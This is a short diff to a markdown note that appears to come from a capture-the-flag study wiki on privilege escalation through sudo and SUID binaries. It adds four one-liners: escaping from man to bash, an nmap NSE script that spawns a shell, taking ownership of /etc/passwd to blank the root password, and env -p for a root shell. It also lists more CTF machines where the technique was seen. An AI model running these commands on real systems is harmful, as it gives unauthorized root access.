@@ -18,8 +18,12 @@ After `sudo -l` or a SUID scan reveals an allowed binary (e.g. `vim`, `ruby`), l
 sudo vim -c ':!/bin/sh' /dev/null
 sudo ruby -e 'exec "/bin/sh"'
 sudo -u <user> /sbin/debugfs -w <image>   # then: debugfs: !/bin/bash
+sudo -u <user> man man                    # then: !/bin/bash
+sudo -u <user> nmap --script=/tmp/x.nse   # NSE os.execute("/bin/sh")
+sudo chown $(id -u):$(id -g) /etc/passwd  # own passwd → blank root password
+env /bin/sh -p                            # SUID env → root shell
 ```
 
 ## Seen in
 
-[[trust]], [[obsession]], [[simple-ctf]], [[vacaciones]], [[hedgehog]], [[borazuwara]], [[hannah-coffee]]
+[[trust]], [[obsession]], [[simple-ctf]], [[vacaciones]], [[hedgehog]], [[borazuwara]], [[hannah-coffee]], [[duque]], [[walkingcms]], [[anonymous-pingu]]
